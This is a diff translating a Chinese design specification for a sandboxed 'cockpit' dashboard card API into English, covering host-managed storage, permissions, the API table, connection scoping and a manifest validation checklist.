-（不透明源没有存储）。所以存储必须由**宿主代管**，经白名单 API 访问：
+The contract promises that a card may only write its own namespace, but in an iframe without `allow-same-origin`,
+`localStorage` / `sessionStorage` / `IndexedDB` all throw a `SecurityError`
+(an opaque origin has no storage). So the storage has to be held on behalf of the card by the host and accessed through the whitelist API:
 
-| 方法 | 签名 | 说明 |
+| Method | Signature | Description |
 |---|---|---|
-| `cockpit.storage.get(key)` | `→ Promise<any>` | 读自己命名空间下的一个键；不存在返回 `undefined` |
-| `cockpit.storage.set(key, value)` | `→ Promise<void>` | 写一个键。`value` 必须是 **JSON 可序列化**的 |
-| `cockpit.storage.remove(key)` | `→ Promise<void>` | 删一个键 |
-| `cockpit.storage.keys()` | `→ Promise<string[]>` | 列出自己命名空间下的全部键 |
-| `cockpit.storage.clear()` | `→ Promise<void>` | 清空自己命名空间 |
+| `cockpit.storage.get(key)` | `→ Promise<any>` | reads one key of its own namespace; `undefined` when it does not exist |
+| `cockpit.storage.set(key, value)` | `→ Promise<void>` | writes one key. `value` has to be JSON serialisable |
+| `cockpit.storage.remove(key)` | `→ Promise<void>` | removes one key |
+| `cockpit.storage.keys()` | `→ Promise<string[]>` | lists all the keys of its own namespace |
+| `cockpit.storage.clear()` | `→ Promise<void>` | empties its own namespace |
 
-**规则**：
+The rules:
 
-| 项 | 规则 |
+| Item | Rule |
 |---|---|
-| 命名空间 | 每张卡一个，按 `卡片 id` 隔离。卡片**只能**看自己的 |
-| 落盘位置 | 宿主数据目录下 `cards/<card-id>/storage.json`，由宿主写入 |
-| 值类型 | 只能是 JSON 可序列化的值（字符串、数字、布尔、null、数组、对象） |
-| 单键上限 | 64 KB；命名空间总量上限 1 MB。超出报 `quota_exceeded` |
-| 键名 | 不得以 `__` 开头（保留给宿主） |
-| 生命周期 | 卡片卸载时**保留**数据（重新装回来还在），除非用户显式清除 |
-| 隔离 | 卡片之间互不可见；宿主不读卡片的业务数据，只保证隔离与配额 |
+| The namespace | one per card, separated by the card id. A card can only see its own |
+| Where it is stored | `cards/<card-id>/storage.json` under the data directory of the host, written by the host |
+| The type of the value | only JSON serialisable values (string, number, boolean, null, array, object) |
+| The limit per key | 64 KB; the limit of the whole namespace is 1 MB. Going over it reports `quota_exceeded` |
+| The name of a key | must not begin with `__` (reserved for the host) |
+| The lifecycle | the data is kept when the card is uninstalled (it is still there when it is installed again), unless the user clears it explicitly |
+| The isolation | the cards cannot see each other; the host does not read the business data of a card, it only guarantees the isolation and the quota |
 
-**卡片拿不到宿主的存储。** 卡片连 `localStorage` 都碰不到（不透明源），
-能碰到的只有上面这五个方法。
+A card cannot reach the storage of the host. It cannot even touch `localStorage` (opaque origin),
+the only thing it can reach is the five methods above.
 
-**「布局存储的受控接口」就是这一套。** 早期版本在 §六 提过这个短语却从未定义它，
-现在它有了明确的落点：`cockpit.storage.*`。
+The controlled interface for the layout storage is this set. An early version mentioned the phrase in section 6 but never defined it;
+it now has a definite landing place: `cockpit.storage.*`.
 
-### 6.3 卡片可依赖的 CSS 变量
+### 6.3 The CSS variables a card may rely on
 
-卡片**不得硬编码颜色**（与上面「网络 / 存储 / 文件」同一个原则）：
-它只能用**宿主注入的 CSS 变量**。而**宿主到底注入哪些变量，是契约**——
+A card must not hard-code colours (the same principle as the network, the storage and the files above):
+it may only use the CSS variables injected by the host. Which variables the host injects is part of the contract:
 
 ```
 --cockpit-bg / --cockpit-bg-elevated / --cockpit-border
@@ -450,220 +450,220 @@ Content-Security-Policy:
 --cockpit-radius / --cockpit-font-mono / --cockpit-font-ui
 ```
 
-| 规则 | 内容 |
+| Rule | Content |
 |---|---|
-| **名字与含义是契约** | 卡片可以依赖上面这 15 个；**改名要升 `apiVersion`** |
-| **值不是契约** | 值由宿主按皮肤给出（暗色 / 浅色各一套）。两套皮肤都必须提供**全部 15 个** |
-| **宿主可以再加** | 实现可以提供更多变量，但**卡片不能依赖没写在这里的** |
-| **语义色对应 tag 五态** | `--cockpit-ok` / `--cockpit-warn` / `--cockpit-danger` / `--cockpit-unavailable` 是**有含义的**：`unavailable` 表达的是「**这块板不提供这个能力**」，读不到就等于把「不可用」说成了「正常」 |
+| The names and their meanings are the contract | a card may rely on the 15 above; renaming them requires a bump of `apiVersion` |
+| The values are not the contract | the values come from the host per skin (one set for the dark skin, one for the light one). Both skins have to provide all 15 |
+| The host may add more | an implementation may provide more variables, but a card may not rely on one that is not written here |
+| The semantic colours correspond to the five states of a tag | `--cockpit-ok` / `--cockpit-warn` / `--cockpit-danger` / `--cockpit-unavailable` carry a meaning: `unavailable` says "this board does not offer this capability", and reading nothing would be turning "unavailable" into "ok" |
 
-> **为什么清单要进契约**：卡片是 AI 写的，它需要一份「**可以依赖什么**」的清单，
-> 否则换个宿主版本就得靠猜——而它不会猜，**它会硬编码**。
-> 形状与取值见卡片的 HTML API 一节。
+> Why the list belongs to the contract: a card is written by an AI, it needs a list of what it may rely on,
+> otherwise a change of the host version leaves it guessing — and it will not guess, it will hard-code.
+> The shape and the values are in the card HTML API section.
 
 ---
 
-## 七、卡片 API
+## 7. The card API
 
-卡片不直接碰连接层。运行时给它一个**受控 API**：
+A card does not touch the connection layer. The runtime gives it a controlled API:
 
 ```js
-// 在卡片 iframe 内可用
+// available inside the card iframe
 const value = await cockpit.tags.get("cpu.usage");
 // => { value: 37.2, unit: "percent", status: "ok", at: 1762910000123 }
 
-cockpit.tags.subscribe("cpu.usage", (v) => { /* 每次刷新 */ });
+cockpit.tags.subscribe("cpu.usage", (v) => { /* on every refresh */ });
 ```
 
-### 7.1 读
+### 7.1 Read
 
-| 方法 | 说明 |
+| Method | Description |
 |---|---|
-| `tags.get(name)` | 取一个 tag 的当前值 |
-| `tags.subscribe(name, cb)` | 订阅一个 tag 的后续值 |
-| `tags.subscribePattern(pattern, cb)` | 订阅一个模式，如 `cpu.core.*.usage` |
-| `tags.list()` | 列出当前可读的全部 tag 及其状态 |
+| `tags.get(name)` | takes the current value of a tag |
+| `tags.subscribe(name, cb)` | subscribes to the later values of a tag |
+| `tags.subscribePattern(pattern, cb)` | subscribes to a pattern, for example `cpu.core.*.usage` |
+| `tags.list()` | lists all the tags that can be read at the moment, with their states |
 
-运行时保证：
+The runtime guarantees:
 
-- 只返回 `permissions.read` 里列出的 tag（模式按模式匹配，见 §2.2）
-- 返回的是**状态化**的值（`01` 的五态），不是裸数字
-- 订阅是**按 poll group 的刷新周期**推送，不是卡片自己轮询
+- It returns only the tags listed in `permissions.read` (a pattern matches by pattern, see section 2.2)
+- What it returns is a stateful value (the five states of `01`), not a bare number
+- The subscription is pushed on the refresh cycle of the poll group, not polled by the card
 
-**关于模式订阅**：卡片的 `requires` 里写的是模式（`cpu.core.*.usage`），
-因为「每核占用率」这个概念不关心有几核。所以订阅也支持模式，
-实例出现时逐个推给卡片（`cpu.core.7.usage` 在 8 核板上出现时）。
+On pattern subscriptions: what a card writes in its `requires` is a pattern (`cpu.core.*.usage`),
+because the concept "the utilisation per core" does not care how many cores there are. So the subscription supports patterns too,
+and pushes each instance to the card as it appears (`cpu.core.7.usage` appears on a board with 8 cores).
 
-### 7.2 降级信号
+### 7.2 Degradation signals
 
-卡片怎么知道某个 tag 缺失？三种信号，都要有：
+How does a card know that a tag is missing? There are three signals, and all three are needed:
 
-| 信号 | 用途 |
+| Signal | Use |
 |---|---|
-| `tags.get(name)` 返回 `status: "unavailable"` | 主动查 |
-| `tags.subscribePattern` 不再推这个实例 | 该实例消失 |
-| `cockpit.degradation()` | 列出这张卡所有缺失/降级的 tag 及原因 |
+| `tags.get(name)` returns `status: "unavailable"` | an active query |
+| `tags.subscribePattern` stops pushing that instance | the instance is gone |
+| `cockpit.degradation()` | lists all the missing or degraded tags of this card with their reasons |
 
-第三种是给「卡片要在界面上写『不可用 · 缺 cpu.usage』」用的。
+The third one is for a card that has to write "unavailable · missing cpu.usage" in the interface.
 
-### 7.3 写
+### 7.3 Write
 
 ```js
 const r = await cockpit.actions.invoke("toggle-npu", { enabled: true });
 // r = { ok: true, readback: { value: true, status: "ok" } }
 ```
 
-见 §五。
+See section 5.
 
-### 7.4 存储
+### 7.4 Storage
 
-见 §6.2。五个方法：`get` / `set` / `remove` / `keys` / `clear`。
+See section 6.2. Five methods: `get` / `set` / `remove` / `keys` / `clear`.
 
-### 7.5 日志
+### 7.5 Logging
 
-| 方法 | 签名 | 说明 |
+| Method | Signature | Description |
 |---|---|---|
-| `cockpit.log(level, message)` | `level ∈ {error, warn, info}` | 写一条卡片运行时日志 |
+| `cockpit.log(level, message)` | `level ∈ {error, warn, info}` | writes one entry to the card runtime log |
 
-卡片运行时日志就是 agent 的「自测眼睛」（`04` §1.2），
-`get_card_runtime_log(cardId)` 能读到卡片写的这些条目。
-所以 `log` 必须存在，且**卡片能写**。
+The card runtime log is the "eyes for the agent's own testing" (section 1.2 of `04`),
+`get_card_runtime_log(cardId)` reads the entries the card has written.
+So `log` has to exist, and the card has to be able to write to it.
 
-### 7.6 通知
+### 7.6 Notifications
 
-| 方法 | 签名 | 说明 |
+| Method | Signature | Description |
 |---|---|---|
-| `cockpit.notify(title, body)` | — | 在宿主弹一条轻量通知（不要求用户回应） |
+| `cockpit.notify(title, body)` | — | shows a lightweight notification in the host (it does not ask the user for an answer) |
 
-通知**不能**用来代替动作确认。**卡片的按钮点击**就是「人在 GUI 里点」那一下 ✓
-（契约 §2.4 ✓ · ADR-D46 ✓）—— **但卡片不能自己弹一个「确定吗」来给自己放行** ✓
-（**那是 agent 那条路** ✓ —— **agent 只能请求** ✓，**人点才算** ✓）。
+A notification cannot replace the confirmation of an action. The click on the button of the card is the "a human clicks in the GUI" moment ✓
+(section 2.4 of the contract ✓ · ADR-D46 ✓) — but the card cannot pop up an "are you sure" for itself and let itself through ✓
+(that is the agent path ✓ — the agent can only ask ✓, and only the human counts ✓).
 
 ---
 
-## 7.7 API 全集（一张表）
+## 7.7 The complete API (one table)
 
-这是**唯一**的 API 定义处。§四 与 §7.1–7.6 讲的都是它。
+This is the only place the API is defined. Section 4 and sections 7.1–7.6 are about it.
 
-| 方法 | 类别 | 权限来源 |
+| Method | Category | Permission source |
 |---|---|---|
-| `cockpit.tags.get(name)` | 读 | `permissions.read` |
-| `cockpit.tags.subscribe(name, cb)` | 读 | `permissions.read` |
-| `cockpit.tags.subscribePattern(pattern, cb)` | 读 | `permissions.read` |
-| `cockpit.tags.list()` | 读 | `permissions.read` |
-| `cockpit.degradation()` | 读 | 无（只返回本卡的降级信息） |
-| `cockpit.capabilities()` | 读 | 无（只返回本宿主的信息） |
-| `cockpit.actions.invoke(id, params)` | 写 | `permissions.write` |
-| `cockpit.workflows.list()` | 读 | 无（只列**注册表里有的**流程 ✓ —— **不再有「用户批过的」那层** ✓） |
-| `cockpit.workflows.run(id, inputs)` | 写 | `permissions.workflows` 里有这个 id ✓ **且**权限区里那行开着 ✓ |
-| `cockpit.workflows.status(runId)` | 读 | 同上（**卡片侧是缩减投影** ✓ —— `05` §八·B·B5 ✓） |
-| `cockpit.storage.get/set/remove/keys/clear` | 存储 | 无（限于本卡命名空间） |
-| `cockpit.log(level, message)` | 日志 | 无 |
-| `cockpit.notify(title, body)` | 通知 | 无 |
+| `cockpit.tags.get(name)` | read | `permissions.read` |
+| `cockpit.tags.subscribe(name, cb)` | read | `permissions.read` |
+| `cockpit.tags.subscribePattern(pattern, cb)` | read | `permissions.read` |
+| `cockpit.tags.list()` | read | `permissions.read` |
+| `cockpit.degradation()` | read | none (it returns the degradation information of this card only) |
+| `cockpit.capabilities()` | read | none (it returns the information of this host only) |
+| `cockpit.actions.invoke(id, params)` | write | `permissions.write` |
+| `cockpit.workflows.list()` | read | none (it lists only the workflows that are in the registry — there is no longer a layer of "the ones the user approved") |
+| `cockpit.workflows.run(id, inputs)` | write | this id is in `permissions.workflows` ✓ and the row in the permission area is on ✓ |
+| `cockpit.workflows.status(runId)` | read | the same (the card side is a reduced projection ✓ — section 8.B.B5 of `05` ✓) |
+| `cockpit.storage.get/set/remove/keys/clear` | storage | none (limited to the namespace of this card) |
+| `cockpit.log(level, message)` | logging | none |
+| `cockpit.notify(title, body)` | notification | none |
 
-**卡片没有「取消流程」的方法** ✓（2026-11-15，依据 `05` §八·A·A4 ✓）：
-「停不停」是**人的判断** ✓ —— 卡片权限**逐方法**授权 ✓，
-而「停一次别人的运行」**不在任何权限项里** ✓ → 要给就得**新增一条权限** ✓，
-而新增权限**不该由流程那一轮顺手加** ✓。
+A card has no "cancel the workflow" method ✓ (2026-11-15, following section 8.A.A4 of `05`):
+whether to stop is a judgement of the human ✓ — the permissions of a card are granted per method ✓,
+and "stop somebody else's run" is on no permission item ✓ → to have it, a new permission has to be added ✓,
+and a new permission should not be added in passing by the workflow round ✓.
 
-**命名前缀统一为 `cockpit.*`**，方法名用小驼峰。
-（`docs/05` 的 ADR-D6 曾列过另一套名字 `getTag / subscribeTag / setAction / log / notify / listTags`，
-现已废弃——那张表指向本文。）
+The naming prefix is uniformly `cockpit.*`, and the method names are in lower camel case.
+(ADR-D6 in the implementation-layer decision record once listed a different set of names — `getTag / subscribeTag / setAction / log / notify / listTags` —
+now deprecated; that table pointed at this document.)
 
-**所有方法都不抛异常**：失败时返回 `{ ok: false, reason }`
-（与 `04` §四 的共同约定一致）。`tags.get` 例外——它返回一个**状态化**的值，
-读不到时是 `{ value: null, status: "unavailable" }`，不是异常。
+No method throws: on failure it returns `{ ok: false, reason }`
+(the common convention of section 4 of `04`). `tags.get` is the exception — it returns a stateful value,
+and when it cannot read, that is `{ value: null, status: "unavailable" }`, not an exception.
 
-**本宿主没有实现的方法**，调用返回 `{ ok: false, reason: 'unknown_method' }`
-（2026-11-14，ADR-D28）。`unknown_method` **不进** `01` §2.1.1 的 tag reason 表——
-那张表是**读数**的原因码；这里说的是**方法不存在**。
-卡片想知道宿主支持什么，**先问 `capabilities()`**：
+A method that this host does not implement returns `{ ok: false, reason: 'unknown_method' }` when it is called
+(2026-11-14, ADR-D28). `unknown_method` does not go into the tag reason table of section 2.1.1 of `01` —
+that table is about the reasons of a reading; here it is about a method that does not exist.
+A card that wants to know what the host supports asks `capabilities()` first:
 
 ```js
 const caps = await cockpit.capabilities();
 // { apiVersion: 'devboard/v1',
 //   methods: ['capabilities', 'tags.get', 'tags.subscribe', …],
-//   connection: { label: '板子 · ADB', transport: 'adb' },
-//   tags: ['cpu.usage', 'mem.usage', …] }   ← 本卡**可读**的那些
+//   connection: { label: 'Board · ADB', transport: 'adb' },
+//   tags: ['cpu.usage', 'mem.usage', …] }   ← the ones this card can read
 ```
 
-| 字段 | 内容 |
+| Field | Content |
 |---|---|
-| `apiVersion` | 契约版本 |
-| `methods` | **本 build 实际实现的方法名**（不是契约全集） |
-| `connection` | 当前连接上下文（**不含 `connectionId`**——卡片代码里没有这个词，见 §7.8） |
-| `tags` | **本卡可读**的 tag 清单（已按 `permissions.read` 过滤） |
+| `apiVersion` | The contract version |
+| `methods` | The names of the methods this build actually implements (not the complete set of the contract) |
+| `connection` | The current connection context (it does not carry `connectionId` — there is no such word in the card code, see section 7.8) |
+| `tags` | The list of the tags this card can read (already filtered by `permissions.read`) |
 
-> **为什么要有它**：卡片是 AI 写的，它**必须知道宿主支持什么**——
-> 否则它只能硬编码假设「`cockpit.tags.get` 一定在」，宿主版本一换就靠 try/catch 猜，
-> 而卡片跑在沙箱里，**猜错了没有任何提示**。
+> Why it exists: a card is written by an AI, it has to know what the host supports —
+> otherwise it can only hard-code the assumption that `cockpit.tags.get` is always there, and once the host version changes it has to guess with try/catch,
+> and a card that runs in a sandbox gets no hint at all when it guesses wrong.
 
-### 7.8 连接上下文（隐式作用域）
+### 7.8 The connection context (implicit scope)
 
-**卡片 API 以宿主注入的连接上下文为隐式作用域。**
+The card API takes the connection context injected by the host as an implicit scope.
 
-| 项 | 规则 |
+| Item | Rule |
 |---|---|
-| tag 名 | 在卡片 API 内**始终是不带连接前缀的全局名**（`cpu.usage`，不是 `board1.cpu.usage`） |
-| 上下文来源 | 卡片**实例**的 connectionId，由宿主在 iframe 创建时注入 |
-| 绑定发生处 | **布局层**：布局单元记录 `(cardId, connectionId)` |
-| manifest | **不携带连接**——卡片声明的是能力，不是去向 |
+| The name of a tag | inside the card API it is always the global name without a connection prefix (`cpu.usage`, not `board1.cpu.usage`) |
+| Where the context comes from | the connectionId of the instance of the card, injected by the host when it creates the iframe |
+| Where the binding happens | in the layout layer: a layout cell records `(cardId, connectionId)` |
+| The manifest | carries no connection — the card declares capabilities, not a destination |
 
-**为什么**：一张卡可以在多个连接上各有一个实例，共享同一份代码目录与授权。
-卡片代码里没有 `connectionId` 这个词——宿主负责把「这个实例看哪块板」翻译成
-TagStore 里的 `(connectionId, tag)` 查找。
+Why: one card can have an instance on each of several connections, sharing the same code directory and the same authorisation.
+There is no `connectionId` in the card code — the host is the one that translates "which board this instance looks at" into
+a `(connectionId, tag)` lookup in the TagStore.
 
-**多板前缀问题（`docs/05` O11）因此被隔离在宿主的解析层**：
-将来支持多板时，前缀只出现在宿主内部，永远不进卡片 API 与 manifest。
+The multi-board prefix problem (the open item O11 of the implementation-layer decision record) is therefore isolated in the resolution layer of the host:
+when multiple boards are supported in the future, the prefix only appears inside the host and never enters the card API or the manifest.
 
 ---
 
-## 八、目录布局
+## 8. The directory layout
 
 ```
 cards/
   cpu-usage/
     manifest.json
     index.html
-    card.js            # 可选
-    style.css          # 可选
+    card.js            # optional
+    style.css          # optional
   npu-control/
     manifest.json
     index.html
 ```
 
-一个目录一张卡。`entry` 指向入口文件，其余文件由卡片自己按需加载（同目录，相对路径）。
+One card per directory. `entry` points at the entry file, the other files are loaded by the card itself as it needs them (same directory, relative paths).
 
 ---
 
-## 九、校验清单
+## 9. The validation checklist
 
-`validate_card(path)` 必须检查：
+`validate_card(path)` has to check:
 
-| # | 规则 |
+| # | Rule |
 |---|---|
-| 1 | `apiVersion` 是已知版本 |
-| 2 | `id` 全局唯一，不与已装卡片冲突 |
-| 3 | `requires` ⊆ `permissions`（愿望不得超出授权，按模式覆盖判定，§2.2）；**`requires.workflows` ⊆ `permissions.workflows`**（精确 id ✓） |
-| 4 | `permissions.read` 里每个 tag 名**匹配核心词表**或落在 `custom.*` 下 |
-| 5 | `permissions.write` 里每个动作 id 在**当前连接的板型包**里存在（连不上板时跳过此检查，标注「未验证」） |
-| 6 | `permissions.write` 里**不允许通配符**（§2.3） |
-| 7 | `actions[]` 里**有 `target` 的**，其 `target` 必须在 `permissions.write` 里 |
-| 8 | `layout.w/h` 在合法范围，`min_w/min_h` ≤ `w/h` |
-| 9 | `entry` 文件存在 |
-| 10 | manifest 是合法 JSON，**每一层都没有未知字段**（防止拼错字段被忽略，§2.5） |
-| 11 | 卡片**不声明** `danger` / `readback`（那两样归板型包管，§5.1） |
-| 12 | `actions[]` 里**没有 `target` 的**是视图内动作，它**不得**出现在 `permissions.write` 里 |
-| 13 | `actions[].params` 的 `type` 必须是封闭取值（`02` §4.3）；`string` 必须有 `maxLength` |
-| 14 | `permissions.workflows` 里每个 id **不许通配符**（同 §2.3 ✓），且**必须是宿主里已声明的流程**（`05` §九 规则 6 ✓） |
-| 15 | **`id` 必须等于卡片目录名** ✓ |
+| 1 | `apiVersion` is a known version |
+| 2 | `id` is globally unique and does not collide with an installed card |
+| 3 | `requires` ⊆ `permissions` (a wish must not exceed the authorisation, judged by pattern coverage, section 2.2); `requires.workflows` ⊆ `permissions.workflows` (exact ids ✓) |
+| 4 | every tag name in `permissions.read` matches the core vocabulary or falls under `custom.*` |
+| 5 | every action id in `permissions.write` exists in the board pack of the current connection (this check is skipped when the board cannot be reached, and marked "not verified") |
+| 6 | no wildcards are allowed in `permissions.write` (section 2.3) |
+| 7 | an entry in `actions[]` that has a `target` must have that `target` in `permissions.write` |
+| 8 | `layout.w/h` are within the legal range, `min_w/min_h` ≤ `w/h` |
+| 9 | the `entry` file exists |
+| 10 | the manifest is valid JSON and no level has an unknown field (this stops a mistyped field from being ignored, section 2.5) |
+| 11 | the card does not declare `danger` / `readback` (those two belong to the board pack, section 5.1) |
+| 12 | an entry in `actions[]` that has no `target` is a view-local action, and it must not appear in `permissions.write` |
+| 13 | the `type` of `actions[].params` has to be one of the closed values (section 4.3 of `02`); a `string` has to have `maxLength` |
+| 14 | every id in `permissions.workflows` has to be free of wildcards (the same as section 2.3 ✓), and it has to be a workflow that is already declared in the host (rule 6 of section 9 of `05` ✓) |
+| 15 | `id` has to be equal to the name of the card directory ✓ |
 
-> **规则 15 为什么有** ✓（2026-11-15 加 ✓ · 依据 ADR-D40 ✓）：
-> 宿主侧**一切按目录名索引** ✓（注册表 ✓ · `uninstall_card` ✓ · `get_card_runtime_log` ✓ · 布局 ✓）。
-> 而 manifest 的 `id` **原本可以与目录名不同** ✓ →
-> 那 agent 从 `list_cards` 拿到的 id 喂给 `uninstall_card` **就找不到东西** ✗。
-> → **一条规则把两套 id 空间并成一套** ✓。
-> → `list_cards` 因此给**两个字段** ✓：`id`（= 目录名 ✓）与 `manifest_id`（= manifest 声明的 ✓）——
-> 两者**仍然可能不同** ✓（manifest 声明的 id 是作者的意愿 ✓ · 目录名是落地的位置 ✓）→
-> **要让 agent 看见这个差别** ✓（`04` §2.2 ✓）。
+> Why rule 15 exists ✓ (added on 2026-11-15 ✓, following ADR-D40 ✓):
+> on the host side everything is indexed by the directory name ✓ (the registry ✓ · `uninstall_card` ✓ · `get_card_runtime_log` ✓ · the layout ✓).
+> And the `id` of the manifest could originally differ from the directory name ✓ →
+> the id that the agent gets from `list_cards` would then find nothing when it is handed to `uninstall_card` ✗.
+> → One rule merges the two id spaces into one ✓.
+> → `list_cards` therefore gives two fields ✓: `id` (the directory name ✓) and `manifest_id` (the one the manifest declares ✓) —
+> the two can still differ ✓ (the id of the manifest is the intention of the author ✓, the directory name is where it landed ✓) →
+> the agent has to see this difference ✓ (section 2.2 of `04` ✓).
 
